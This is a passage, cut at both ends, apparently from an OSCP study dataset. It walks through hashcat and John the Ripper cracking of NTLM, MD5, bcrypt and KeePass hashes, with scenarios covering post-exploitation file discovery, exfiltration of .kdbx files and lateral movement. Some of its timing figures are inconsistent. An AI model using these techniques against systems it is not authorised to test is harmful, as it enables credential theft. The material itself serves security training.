Administrators often use: Seasonal passwords (Summer2024!), Policy compliance (Password1!), Company name + year. Rules generate these variations automatically. Success factors: 1) Weak NTLM algorithm, 2) GPU power, 3) Rule intelligence (targeted mutations). Even slow algorithms crack with good wordlist.""}, {""title"": ""Scenario 3: Time-Constrained Bcrypt Cracking"", ""context"": ""You've dumped bcrypt hashes from web application database (WordPress): admin:$2b$10$salt$hash. bcrypt is SLOW (designed to resist GPU cracking). Benchmark shows 100 H/s (100 attempts per second). Exam has 3 hours remaining. You need to crack this or find alternative. Calculate if attack is viable."", ""approach"": ""1. Identify: $2b$ = bcrypt, $10$ = cost factor (2^10 = 1,024 rounds). 2. Benchmark: hashcat -b -m 3200 \u2192 100 H/s. 3. Calculate keyspace: rockyou.txt = 14M passwords. Time: 14M \u00f7 100 = 140,000 seconds = 39 hours. 4. Decision: Full rockyou NOT viable in exam. 5. Alternative strategy: Top 10,000 rockyou (head -10000 rockyou.txt > top10k.txt). Time: 10k \u00f7 100 = 100 seconds = 1.6 minutes. 6. If fails: Try top 100k (17 minutes). 7. If still fails: ABANDON - find alternative (password reset, SQL injection, RCE)."", ""commands"": [""hashid"", ""hash-rate-benchmark"", ""calculate-crack-time"", ""attack-mode-decision"", ""hashcat-bcrypt-crack"", ""wordlist-effectiveness""], ""expected_outcome"": ""Top 10k test completes in ~2 minutes. Success rate: 15-20% (common passwords). If MISS: Top 100k in ~17 minutes (success rate 30-35%). If still MISS: STOP - attack not viable. Redirect effort: Look for password reset function, check for hardcoded credentials in source, search for backup files with plaintext passwords. Time saved: Recognize unfeasible attack early. Exam strategy: Don't waste hours on low-probability cracks."", ""why_this_works"": ""bcrypt DESIGNED to be slow (exponential cost factor). $10 = 1,024 rounds, $12 = 4,096 rounds (4x slower). GPU advantage reduced (bcrypt memory-hard). 100 H/s vs NTLM 50 GH/s = 500 million times slower. Mathematics: Full rockyou = 39 hours (exceeds exam time). Top 10k = feasible (1.6 min). Decision tree: Fast hash (NTLM, MD5) = Aggressive attacks viable. Slow hash (bcrypt, scrypt) = Targeted attacks only. Success depends on: Password in top N of wordlist. Alternative attacks: Password reset tokens, configuration file passwords, default credentials.""}, {""title"": ""Scenario 4: Custom Rule Creation Based on Policy"", ""context"": ""You've obtained NTLM hash from Windows workstation. Active Directory password policy discovered via LDAP query: Minimum 10 characters, 1 uppercase, 1 digit, 1 special character, No dictionary words allowed. Observed pattern from other systems: Company name (Contoso) + Season + Year + special char. You have 2 hours to crack."", ""approach"": ""1. Create custom wordlist: Seasons (Spring, Summer, Fall, Winter), Years (2020-2024), Company (Contoso, Contoso123). Total: ~50 words. 2. Create custom rule: c $2 $0 $2 $4 $! (Capitalize + append 2024!). 3. Test rule with --stdout: hashcat wordlist.txt -r custom.rule --stdout | head. Verify: Contoso \u2192 Contoso2024! 4. Calculate: 50 words \u00d7 1 rule = 50 candidates \u00f7 50 GH/s = instantaneous. 5. Expand rules: Try all years (2020-2024), Try special chars (!@#$), Total: 50 words \u00d7 5 years \u00d7 4 special = 1,000 candidates. 6. Run attack with custom wordlist + custom rules."", ""commands"": [""create-policy-rules"", ""hashcat-test-rules"", ""wordlist-effectiveness"", ""hashcat-rule-attack"", ""hashcat-show-cracked""], ""expected_outcome"": ""Custom attack completes in <1 second (NTLM speed + small wordlist). Success: Contoso:31d6...:Contoso2024! Hit rate: 60-70% (targeted attack based on intelligence). Verification: Use credential for SMB shares, RDP access, lateral movement. Key insight: Intelligence-driven attack (policy + patterns) beats brute force. 1,000 targeted candidates > 14M generic candidates. Time to craft rules: 10 minutes. Time to crack: <1 second. Total: 10 minutes vs 39 hours (brute force)."", ""why_this_works"": ""Humans are predictable. Password policies force patterns: Policy requires special char \u2192 Users append ! (easiest key). Policy requires digit \u2192 Users append year (easy to remember). Policy requires uppercase \u2192 Users capitalize first letter. Policy bans dictionary words \u2192 Users modify existing words (Contoso not in dict). Custom rules exploit psychology: c = capitalize (first letter easiest), $ = append (path of least resistance), Year = memorable (current year), Special = minimal effort (!). Success rate: Targeted attack (60%) vs Generic attack (15%) for policy-compliant passwords. Lesson: Gather intelligence (policy, patterns, company info) BEFORE attacking.""}, {""title"": ""Scenario 5: Incremental Mode and Mask Attack for Unknown Password"", ""context"": ""You've exhausted wordlists against MD5 hash from PHP web app. Straight rockyou failed, rules failed. You KNOW password exists (critical for exam point). Last resort: Brute force with masks. You observed: Username format is 'firstlast', Password pattern might be: firstlast + digits (john1234). Hash type: MD5 (fast, 20 GH/s). Time remaining: 8 hours."", ""approach"": ""1. Extract username from hash file: john. 2. Create mask based on hypothesis: john?d?d?d?d (john + 4 digits). Charset: ?d = digit (0-9). 3. Calculate keyspace: 4-digit = 10^4 = 10,000 combinations. Time: 10,000 \u00f7 20B H/s = 0.0005 seconds. 4. Expand if failed: john?d?d?d?d?d?d (6 digits = 1M combinations, 0.05 seconds). 5. Try variations: John?d?d?d?d (capitalized), JOHN?d?d?d?d (uppercase). 6. If still fails: Try incremental: ?l?l?l?l?l?l?l?l (8 lowercase letters = 208B combinations, 2.9 hours)."", ""commands"": [""calculate-keyspace"", ""hashcat-mask-attack"", ""hashcat-increment"", ""hashcat-custom-charset"", ""calculate-crack-time"", ""session-management""], ""expected_outcome"": ""Mask john?d?d?d?d tests in <1 second (10k combinations). Success: john:5f4dcc3b5aa765d61d8327deb882cf99:john1234. If failed, expand to 6 digits (1M combinations, still <1 second). Capitalization variations add 3x multiplier (still fast). Incremental mode (8 lowercase) = 2.9 hours (viable if exam time allows). Key: Start specific (mask based on pattern), expand gradually (more characters/positions). Avoid: Full brute force (8-char alphanumeric = 62^8 = 218T combinations = 3 hours even on MD5)."", ""why_this_works"": ""Mask attack targets KNOWN patterns (username-based common). Keyspace reduction: 62^8 (218T) \u2192 10^4 (10k) = 21.8 million times smaller. MD5 speed enables brute-force for small keyspaces. Pattern recognition: Developers/admins use: Username + digits (easy to remember), Keyboard patterns (qwerty123), Repeated characters (aaaa1111). Incremental mode: Hashcat/John try SHORT passwords first (length 1, 2, 3...), Most passwords 8-12 chars, Starting from 1 optimizes discovery. Success factors: 1) Fast hash (MD5), 2) Pattern hypothesis (username-based), 3) Small keyspace (4-6 digits). Lesson: When wordlists fail, think patterns before full brute-force.""}]","[{""title"": ""Phase 1: Hash Identification and Analysis"", ""notes"": ""First step: Identify hash type correctly. Use hashid for automated detection (shows Hashcat/John modes). Manually verify: Length (32=MD5/NTLM, 40=SHA1, 64=SHA256), Prefix ($6$=sha512crypt, $2b$=bcrypt, $1$=md5crypt), Format (hex vs base64 vs custom). Extract hash cleanly: Remove usernames, salts handled by tools. Understand algorithm speed: Fast (MD5, NTLM, SHA1) = Aggressive attacks viable. Slow (bcrypt, scrypt, PBKDF2) = Targeted attacks only."", ""commands"": [{""id"": ""hashid"", ""example"": ""hashid '5f4dcc3b5aa765d61d8327deb882cf99' -m"", ""shows"": ""[+] MD5""}, {""id"": ""hash-identifier"", ""example"": ""hash-identifier"", ""shows"": ""Possible Hashs:""}, {""id"": ""hash-rate-benchmark"", ""example"": ""hashcat -b -m 1000 | grep -A3 'Hashmode:'"", ""shows"": ""Hash rate displayed (H/s, kH/s, MH/s, GH/s)""}]}, {""title"": ""Phase 2: Benchmark and Time Estimation"", ""notes"": ""Before attacking, estimate time investment. Run benchmark for EXACT hash type (don't assume). Calculate crack time: Total passwords \u00f7 Hash rate \u00f7 Parallel tasks. Create decision matrix: <1 hour = Proceed immediately, 1-4 hours = Consider exam time constraints, 4-24 hours = Overnight only, >24 hours = Alternative strategy. Factor in: GPU temperature (throttling reduces speed), Other processes (reduce GPU availability), Exam time remaining (critical constraint)."", ""commands"": [{""id"": ""hash-rate-benchmark"", ""example"": ""hashcat -b -m 1000 | grep -A3 'Hashmode:'"", ""shows"": ""Hash rate displayed (H/s, kH/s, MH/s, GH/s)""}, {""id"": ""calculate-keyspace"", ""example"": ""python3 -c \""import math; charset=62; length=8; print(f'Keyspace: {charset**length:,} combinations')\"""", ""shows"": ""Keyspace displayed""}, {""id"": ""calculate-crack-time"", ""example"": ""python3 -c \""keyspace=218340105584896; hash_rate=1000000000; seconds=keyspace/hash_rate; hours=seconds/3600; print(f'Time: {hours:.2f} hours ({hours/24:.2f} days)')\"""", ""shows"": ""Time estimate displayed""}, {""id"": ""wordlist-effectiveness"", ""example"": ""wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c \""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')\"""", ""shows"": ""Line count displayed""}, {""id"": ""attack-mode-decision"", ""example"": ""echo 'Attack Mode Decision Tree:\\n1. Straight Wordlist (fastest, try first)\\n2. Wordlist + Rules (best balance)\\n3. Combinator (merge wordlists)\\n4. Mask Attack (known pattern)\\n5. Brute Force (last resort)'"", ""shows"": ""Decision tree displayed""}]}, {""title"": ""Phase 3: Attack Strategy Selection"", ""notes"": ""Choose attack mode based on hash speed + time available. FAST hashes (MD5, NTLM, SHA1): Try straight wordlist \u2192 rules (best64) \u2192 rules (rockyou-30000) \u2192 mask attack. SLOW hashes (bcrypt, sha512crypt): Try top 10k \u2192 top 100k \u2192 custom targeted wordlist \u2192 ABANDON if exceeds time. PATTERN-BASED: Known policy/pattern \u2192 Create custom rules \u2192 Targeted wordlist. Session management critical: Save session for pause/resume, Monitor progress regularly, Adjust strategy based on ETA."", ""commands"": [{""id"": ""attack-mode-decision"", ""example"": ""echo 'Attack Mode Decision Tree:\\n1. Straight Wordlist (fastest, try first)\\n2. Wordlist + Rules (best balance)\\n3. Combinator (merge wordlists)\\n4. Mask Attack (known pattern)\\n5. Brute Force (last resort)'"", ""shows"": ""Decision tree displayed""}, {""id"": ""hashcat-md5-crack"", ""example"": ""hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt --force"", ""shows"": ""Cracked""}, {""id"": ""hashcat-ntlm-crack"", ""example"": ""hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force"", ""shows"": ""Cracked""}, {""id"": ""hashcat-sha256-crack"", ""example"": ""hashcat -m 1400 sha256_hashes.txt /usr/share/wordlists/rockyou.txt --force"", ""shows"": ""Status...........: Cracked""}, {""id"": ""hashcat-bcrypt-crack"", ""example"": ""hashcat -m 3200 bcrypt_hashes.txt /usr/share/wordlists/rockyou.txt --force"", ""shows"": ""Cracked""}, {""id"": ""hashcat-sha512crypt-crack"", ""shows"": ""See command documentation""}, {""id"": ""john-wordlist-attack"", ""example"": ""john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"", ""shows"": ""Loaded X password hash""}, {""id"": ""john-rules-attack"", ""example"": ""john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash"", ""shows"": ""guesses: X""}]}, {""title"": ""Phase 4: Rule-Based Attacks"", ""notes"": ""Rules multiply wordlist effectiveness. Start conservative (best64 = 64 rules, fast), escalate to aggressive (rockyou-30000, slow). Test rules first with --stdout (verify mutations match expectations). Custom rules for intelligence-driven attacks: Create rules matching discovered policy, Use company-specific patterns (names, products), Target seasonal/year patterns (Spring2024!). Rule syntax: $ (append), ^ (prepend), c (capitalize), s (substitute), d (duplicate). Combine operators: c $2 $0 $2 $4 $! = Capitalize + append 2024!"", ""commands"": [{""id"": ""hashcat-best64-rules"", ""example"": ""hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"", ""shows"": ""Session started""}, {""id"": ""hashcat-rockyou-rules"", ""example"": ""hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force"", ""shows"": ""Session started""}, {""id"": ""hashcat-rule-attack"", ""example"": ""hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"", ""shows"": ""Guess.Mod........: Rules""}, {""id"": ""hashcat-test-rules"", ""example"": ""hashcat passwords.txt -r custom.rule --stdout | head -20"", ""shows"": ""Mutated passwords displayed""}, {""id"": ""john-rules-attack"", ""example"": ""john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash"", ""shows"": ""guesses: X""}, {""id"": ""john-test-rules"", ""example"": ""john --wordlist=passwords.txt --rules=KoreLogic --stdout | head -20"", ""shows"": ""Mutated passwords displayed""}, {""id"": ""create-policy-rules"", ""example"": ""echo -e 'c $2024 $!\\nc $2024 $@\\nc $2024 $#' > policy.rule"", ""shows"": ""Rule file created""}, {""id"": ""rule-capitalize-append"", ""example"": ""echo 'c $!' > cap-special.rule"", ""shows"": ""Rule file created""}, {""id"": ""rule-leet-speak"", ""example"": ""echo -e 'sa@\\nse3\\nsi1\\nso0\\nss$' > leet.rule"", ""shows"": ""Rule file created""}]}, {""title"": ""Phase 5: Advanced Techniques and Fallback"", ""notes"": ""If standard attacks fail, use advanced techniques: Mask attacks for known patterns (username?d?d?d?d), Hybrid attacks (wordlist + mask: rockyou.txt ?d?d?d), Combinator attacks (merge two wordlists), Incremental mode (John's smart brute-force). Fallback strategies when cracking fails: Look for password reset functionality, Search for configuration files with plaintext passwords, Check for default credentials (admin:admin), Attempt SQL injection for password change, Find alternative exploitation paths (RCE, file upload, XXE)."", ""commands"": [{""id"": ""hashcat-mask-attack"", ""example"": ""hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?s --force"", ""shows"": ""Guess.Mask.......: <MASK>""}, {""id"": ""hashcat-hybrid-attack"", ""example"": ""hashcat -m 0 -a 6 hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?s --force"", ""shows"": ""Guess.Base.......: File, Mask""}, {""id"": ""hashcat-combination-attack"", ""example"": ""hashcat -m 0 -a 1 hashes.txt words1.txt words2.txt --force"", ""shows"": ""Guess.Base.......: File, File (combination)""}, {""id"": ""hashcat-increment"", ""example"": ""hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a --increment --increment-min=4 --increment-max=8 --force"", ""shows"": ""Shows discovered services/users/shares""}, {""id"": ""john-incremental-mode"", ""example"": ""john --incremental hashes.txt"", ""shows"": ""Proceeding with incremental mode""}, {""id"": ""calculate-keyspace"", ""example"": ""python3 -c \""import math; charset=62; length=8; print(f'Keyspace: {charset**length:,} combinations')\"""", ""shows"": ""Keyspace displayed""}]}, {""title"": ""Phase 6: Results Management and Documentation"", ""notes"": ""When hash cracks: Verify immediately (attempt authentication with plaintext), Document in notes (hash, plaintext, service, timestamp), Test password reuse (same password on other services), Check hashcat.potfile for persistent storage. Session management: Use --session for named sessions, Resume with --restore, Check status without interrupting (--status). Output management: Save to file with -o, Use --outfile-format=2 for plaintext only, Review hashcat.potfile for all historical cracks."", ""commands"": [{""id"": ""hashcat-show-cracked"", ""example"": ""hashcat -m 0 hashes.txt --show"", ""shows"": ""<HASH>:<PASSWORD>""}, {""id"": ""session-management"", ""example"": ""hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --session=exam-target1 -o cracked.txt --outfile-format=2"", ""shows"": ""Session started""}, {""id"": ""monitor-crack-progress"", ""example"": ""watch -n 5 'hashcat --session=exam-target1 --status 2>&1 | grep -E \""Progress|Speed|Recovered|Time\""'"", ""shows"": ""Progress percentage increasing""}, {""id"": ""optimize-crack-performance"", ""example"": ""hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -w 3 -O --force"", ""shows"": ""Higher H/s rate vs. default""}]}]"
"keepass-database-cracking","KeePass Password Manager Cracking","Complete workflow for discovering, extracting, and cracking KeePass database master passwords","PASSWORD_ATTACKS|KEEPASS|PASSWORD_MANAGER|HASH_CRACKING|OSCP:MEDIUM","{""how_to_recognize"": [""File enumeration reveals .kdbx files (KeePass 2.x database format) in: ~/Documents, Desktop, Downloads, network shares"", ""Process enumeration shows KeePass.exe or keepass2 running (user actively using password manager)"", ""Registry keys found: HKCU\\Software\\KeePass or configuration files in %APPDATA%\\KeePass"", ""File searches discover: Database.kdbx, passwords.kdbx, vault.kdbx, company.kdbx"", ""KeePass portable installation found in: USB drives, network shares, cloud sync folders (Dropbox, OneDrive)""], ""when_to_look_for"": [""Post-exploitation: After gaining initial access (web shell, RCE, low-privilege user)"", ""File enumeration: When searching for sensitive files (find / -name '*.kdbx' 2>/dev/null)"", ""Network share access: SMB shares with user directories or IT department folders"", ""Backup discoveries: Found database backups in: archive folders, version control (.git), network drives"", ""OSCP exam: When you've exhausted other password discovery methods and need credential access""]}","[{""title"": ""Scenario 1: KeePass Discovery on Windows Desktop"", ""context"": ""You've gained low-privilege access to Windows 10 workstation via RCE vulnerability. Username: john.doe. You need to escalate privileges or find credentials for lateral movement. Enumerate user's files and discover: C:\\Users\\john.doe\\Documents\\Passwords.kdbx (4.2 MB). File is recent (modified 2 days ago). You suspect john uses this for storing credentials. Goal: Extract master password hash and crack it."", ""approach"": ""1. Download Passwords.kdbx to attacker machine (SMB, HTTP, base64 exfiltration). 2. Verify file integrity: file Passwords.kdbx (should show 'Keepass password database'). 3. Extract hash using keepass2john: keepass2john Passwords.kdbx > keepass.hash. 4. Clean hash: Remove 'Passwords:' prefix for Hashcat (keep for John). 5. Identify hash format: $keepass$*2*60000*... ($keepass$ = KeePass, *2* = version 2.x, *60000* = 60k transform rounds). 6. Benchmark: hashcat -b -m 13400 (KeePass mode). 7. Calculate time based on benchmark results."", ""commands"": [""keepass2john-extract"", ""hashid"", ""hash-rate-benchmark"", ""calculate-crack-time"", ""attack-mode-decision""], ""expected_outcome"": ""keepass2john outputs: Passwords.kdbx:$keepass$*2*60000*0*hash_data_here. File command confirms: 'Keepass password database 2.x KDBX'. Benchmark shows: ~10 H/s (extremely slow - bcrypt-level). Time calculation: rockyou (14M) \u00f7 10 H/s = 1.4M seconds = 389 hours = 16 days (NOT viable). Decision: Use top 10k wordlist (10k \u00f7 10 = 1,000 seconds = 16 minutes - viable). If fails, try top 100k (2.7 hours). Key insight: KeePass designed to resist cracking - must use targeted wordlists."", ""why_this_works"": ""KeePass uses AES-256 encryption with key derivation (PBKDF2 or Argon2). Transform rounds parameter (60,000 default) slows down each password attempt. Each guess requires 60,000 SHA-256 iterations before AES decryption attempt. GPU advantage minimal (memory-hard on version 2.x). 10 H/s typical on high-end GPU. Success depends on: User chose WEAK master password (defeats purpose of password manager!), Password in top N of wordlist, Patience (slow cracking requires time). Alternative: If john.doe reuses passwords, try: Known passwords from other services, Variations of username, Company name + year patterns.""}, {""title"": ""Scenario 2: Network Share KeePass Discovery"", ""context"": ""You've compromised user account via password spraying (sarah.jones:Summer2024!). SMB enumeration reveals writeable share: \\\\fileserver\\IT-Dept\\. Browse share and find: Backups\\Database_2024.kdbx, README.txt ('Master password: Company policy - FirstnameYear!'). This intelligence drastically narrows password space. You have Sarah's credentials but need elevated access. Hypothesis: Database master password follows pattern Sarah2024!"", ""approach"": ""1. Download Database_2024.kdbx from SMB share. 2. Extract hash: keepass2john Database_2024.kdbx > db.hash. 3. Create custom wordlist based on intelligence: Common first names (Sarah, John, Michael, Emily) + years (2020-2024) + special chars (!@#). 4. Generate variations: Sarah2024!, sarah2024!, SARAH2024!. 5. Total candidates: 20 names \u00d7 5 years \u00d7 3 special chars \u00d7 3 capitalizations = ~900 passwords. 6. Calculate time: 900 \u00f7 10 H/s = 90 seconds. 7. Run targeted attack: hashcat -m 13400 db.hash custom.txt."", ""commands"": [""keepass2john-extract"", ""create-policy-rules"", ""wordlist-effectiveness"", ""calculate-crack-time"", ""hashcat-keepass-crack""], ""expected_outcome"": ""Custom wordlist attack completes in ~90 seconds. Success: Database_2024.kdbx:$keepass$...:Michael2024! (IT admin's first name + year). Verification: keepass2 Database_2024.kdbx (open with cracked password). Database contains: Domain admin credentials, Service account passwords, Network device passwords, Application API keys. Immediate privilege escalation or lateral movement. Time investment: 10 minutes (wordlist creation) + 90 seconds (cracking) = 11 minutes total vs 16 days (blind attack)."", ""why_this_works"": ""Intelligence dramatically reduces keyspace. README.txt provided pattern (accidental information disclosure). Corporate password policies often mandate patterns (easy for users, predictable for attackers). Pattern 'FirstnameYear!' extremely common (compliance with: uppercase, lowercase, digit, special char requirements). Math: 900 targeted candidates vs 14M generic = 15,555x reduction. KeePass slow speed (10 H/s) becomes manageable. Lesson: Always search for intelligence BEFORE attacking (documentation, README files, comments, policies). Intelligence-driven > Brute-force for slow hashes.""}, {""title"": ""Scenario 3: KeePass with Keyfile Authentication"", ""context"": ""You've extracted KeePass database from compromised system: vault.kdbx. Attempt to crack hash fails (no hits after 100k rockyou). Investigate further: find vault.key file in same directory. KeePass supports dual authentication: Master password + Keyfile. Both required to decrypt. You have keyfile but not master password. Challenge: Crack master password WITH keyfile present."", ""approach"": ""1. Download BOTH vault.kdbx and vault.key. 2. Extract hash: keepass2john -k vault.key vault.kdbx > vault.hash (NOTE: -k flag includes keyfile in hash). 3. Hash format changes: includes keyfile data in hash string. 4. Benchmark unchanged: still ~10 H/s. 5. Strategy: Keyfile reduces user's perceived need for strong password (false sense of security). Try common weak passwords: password, Password1, 123456, qwerty. 6. Run attack with small wordlist first (top 1k). 7. Expand if needed (top 10k, top 100k)."", ""commands"": [""keepass2john-extract"", ""wordlist-effectiveness"", ""hashcat-keepass-crack"", ""john-keepass-crack""], ""expected_outcome"": ""Keyfile hash extraction: vault.kdbx:$keepass$*2*...*keyfile_data*.... Top 1k wordlist completes in 100 seconds (1k \u00f7 10 H/s). Success: vault:$keepass$...:password (user chose 'password' because keyfile provides 'real' security). Verification requires BOTH: keepass2 vault.kdbx --keyfile vault.key (enter 'password', database unlocks). Key insight: Dual-factor authentication undermines password strength (users compensate with weaker passwords). Keyfile must be included in hash extraction (-k flag) for crack to succeed."", ""why_this_works"": ""KeePass keyfile authentication: User provides password + keyfile path, KeePass derives key from: SHA-256(password + keyfile_contents), Combined key decrypts database. Without keyfile, password alone fails. Psychological factor: Users think keyfile = security, so they choose weak passwords ('keyfile is the REAL password'). This defeats purpose - attacker with filesystem access has BOTH files. Keyfile format: Usually .key file (binary data) or any file (image, text, executable). Hash must include keyfile data for cracking tools to replicate key derivation. Success because: User chose weak password, Keyfile available to attacker, Tools support keyfile-based hashes. Defense: Strong password + keyfile (both should be strong).""}, {""title"": ""Scenario 4: Cracking Old KeePass Database"", ""context"": ""During filesystem enumeration, you discover old backup: Database_OLD.kdb (note: .kdb not .kdbx). KeePass 1.x format (deprecated since 2013). You're curious if it contains stale but useful credentials. Extract hash and notice: $keepass$*1*... (*1* = version 1.x). Benchmark shows: ~1,000 H/s (100x faster than version 2.x!). Older encryption = faster cracking."", ""approach"": ""1. Identify version: file Database_OLD.kdb \u2192 'Keepass password database 1.x'. 2. Extract hash: keepass2john Database_OLD.kdb > old.hash. 3. Hash shows: $keepass$*1*... (version 1.x indicator). 4. Benchmark: hashcat -b -m 13400 (same mode for 1.x and 2.x). Observe: ~1,000 H/s (much faster). 5. Calculate: rockyou (14M) \u00f7 1,000 H/s = 14,000 seconds = 3.8 hours. 6. Strategy: Version 1.x cracks faster - full rockyou viable. 7. Add rules if straight fails: rockyou + best64 = 14M \u00d7 64 \u00f7 1k H/s = ~10 days (still manageable overnight with rules subset)."", ""commands"": [""keepass2john-extract"", ""hashid"", ""hash-rate-benchmark"", ""calculate-crack-time"", ""hashcat-keepass-crack"", ""hashcat-rule-attack""], ""expected_outcome"": ""Straight rockyou completes in ~4 hours. Success: Database_OLD.kdb:$keepass$*1*...:welcome123 (old weak password). Database contains: Outdated but potentially reused credentials, Historical admin passwords (may still work on old systems), API keys for legacy services, VPN credentials. Even if credentials expired, useful for: Password pattern analysis (user's password habits), Cracking other hashes (password reuse), Understanding environment (service names, usernames). Time: 4 hours (unattended, run overnight) vs 16 days (version 2.x)."", ""why_this_works"": ""KeePass 1.x uses weaker encryption (AES-256 but fewer transform rounds by default). Version 1.x default: 6,000 rounds vs 2.x: 60,000 rounds (10x difference). Older algorithm implementations less optimized for resistance. Hash rate: 1,000 H/s (v1.x) vs 10 H/s (v2.x) = 100x faster. Database deprecated but may contain: Credentials never rotated, Passwords reused on current systems, Patterns revealing user habits. Success because: Weaker legacy encryption, Old passwords (likely weak - pre-policy era), Full wordlist viable in reasonable time. Lesson: Always check old backups - weaker security, potential password reuse.""}]","[{""title"": ""Phase 1: KeePass Database Discovery"", ""notes"": ""Search for KeePass databases across filesystem and network shares. Common locations: Windows: C:\\Users\\*\\Documents, Desktop, Downloads, AppData\\Roaming\\KeePass. Linux: ~/Documents, ~/.config/keepass, /opt/KeePass. Network: SMB shares (IT-Dept, Backups, Users, Shared Documents). Cloud sync: Dropbox, OneDrive, Google Drive folders. File extensions: .kdbx (KeePass 2.x, current), .kdb (KeePass 1.x, legacy). Search commands: Windows: dir /s /b *.kdbx, Linux: find / -name '*.kdbx' 2>/dev/null. Check file age: Recent = actively used, Old = backup/stale credentials."", ""commands"": []}, {""title"": ""Phase 2: Hash Extraction and Identification"", ""notes"": ""Extract hash using keepass2john tool (part of John the Ripper suite). Syntax: keepass2john <DATABASE> > <HASH_FILE>. For keyfile authentication: keepass2john -k <KEYFILE> <DATABASE> > <HASH_FILE>. Clean hash for Hashcat: Remove 'filename:' prefix (keep for John). Identify version: *1* = KeePass 1.x (faster cracking), *2* = KeePass 2.x (slower). Note transform rounds: *60000* = 60k rounds (slower), *6000* = 6k rounds (faster). Higher rounds = longer crack time (exponentially)."", ""commands"": [{""id"": ""keepass2john-extract"", ""example"": ""keepass2john Database.kdbx > keepass.hash"", ""shows"": ""$keepass$*2*""}, {""id"": ""hashid"", ""example"": ""hashid '5f4dcc3b5aa765d61d8327deb882cf99' -m"", ""shows"": ""[+] MD5""}, {""id"": ""hash-identifier"", ""example"": ""hash-identifier"", ""shows"": ""Possible Hashs:""}]}, {""title"": ""Phase 3: Benchmark and Strategy"", ""notes"": ""Benchmark KeePass hash cracking speed on your hardware. Hashcat mode 13400 for both 1.x and 2.x. Typical rates: Version 1.x = 500-1,500 H/s (GPU), Version 2.x = 5-15 H/s (GPU). Calculate time: (Wordlist size \u00f7 Hash rate) = Seconds. Strategy decision: <1 hour = Full rockyou viable, 1-10 hours = Top 100k or targeted wordlist, >10 hours = Custom intelligence-based wordlist only. Remember: KeePass DESIGNED to resist cracking - respect the math."", ""commands"": [{""id"": ""hash-rate-benchmark"", ""example"": ""hashcat -b -m 1000 | grep -A3 'Hashmode:'"", ""shows"": ""Hash rate displayed (H/s, kH/s, MH/s, GH/s)""}, {""id"": ""calculate-crack-time"", ""example"": ""python3 -c \""keyspace=218340105584896; hash_rate=1000000000; seconds=keyspace/hash_rate; hours=seconds/3600; print(f'Time: {hours:.2f} hours ({hours/24:.2f} days)')\"""", ""shows"": ""Time estimate displayed""}, {""id"": ""calculate-keyspace"", ""example"": ""python3 -c \""import math; charset=62; length=8; print(f'Keyspace: {charset**length:,} combinations')\"""", ""shows"": ""Keyspace displayed""}, {""id"": ""attack-mode-decision"", ""example"": ""echo 'Attack Mode Decision Tree:\\n1. Straight Wordlist (fastest, try first)\\n2. Wordlist + Rules (best balance)\\n3. Combinator (merge wordlists)\\n4. Mask Attack (known pattern)\\n5. Brute Force (last resort)'"", ""shows"": ""Decision tree displayed""}, {""id"": ""wordlist-effectiveness"", ""example"": ""wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c \""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')\"""", ""shows"": ""Line count displayed""}]}, {""title"": ""Phase 4: Intelligence Gathering"", ""notes"": ""Before blind attacks, search for intelligence to create targeted wordlist. Look for: README files (may contain password hints or policies), Configuration files (KeePass.config.xml in AppData), Documentation (IT policies, password requirements), User patterns (usernames, email addresses, company info), Related files (text files in same directory as .kdbx). Common KeePass password patterns: Company name + year + special (Contoso2024!), Username + digits (john1234), Keyboard patterns (qwerty123), Policy compliance (Password1!). Create custom wordlist based on findings (100-1000 words better than 14M generic)."", ""commands"": [{""id"": ""create-policy-rules"", ""example"": ""echo -e 'c $2024 $!\\nc $2024 $@\\nc $2024 $#' > policy.rule"", ""shows"": ""Rule file created""}, {""id"": ""rule-capitalize-append"", ""example"": ""echo 'c $!' > cap-special.rule"", ""shows"": ""Rule file created""}, {""id"": ""rule-prepend-year"", ""example"": ""echo '^2 ^0 ^2 ^4' > prepend-year.rule"", ""shows"": ""Rule file created""}, {""id"": ""wordlist-effectiveness"", ""example"": ""wc -l /usr/share/wordlists/rockyou.txt && echo 'With rules: ' && python3 -c \""lines=14344391; rules=64; print(f'{lines * rules:,} total candidates')\"""", ""shows"": ""Line count displayed""}]}, {""title"": ""Phase 5: Cracking Execution"", ""notes"": ""Launch cracking attack with appropriate strategy. For FAST hashes (v1.x): Try rockyou straight, then rockyou + best64 rules. For SLOW hashes (v2.x): Start with top 10k, then custom wordlist, then top 100k if time allows. Use session management: hashcat --session=keepass-crack (enables pause/resume). Monitor progress: hashcat --session=keepass-crack --status. Hashcat alternative: John the Ripper (john --wordlist=rockyou.txt keepass.hash). John may be faster for KeePass on some hardware. Compare benchmarks between tools."", ""commands"": [{""id"": ""hashcat-keepass-crack"", ""example"": ""hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force"", ""shows"": ""Cracked""}, {""id"": ""john-keepass-crack"", ""example"": ""john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules keepass.hash"", ""shows"": ""Loaded 1 password hash (KeePass [SHA256 AES])""}, {""id"": ""hashcat-rule-attack"", ""example"": ""hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"", ""shows"": ""Guess.Mod........: Rules""}, {""id"": ""session-management"", ""example"": ""hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --session=exam-target1 -o cracked.txt --outfile-format=2"", 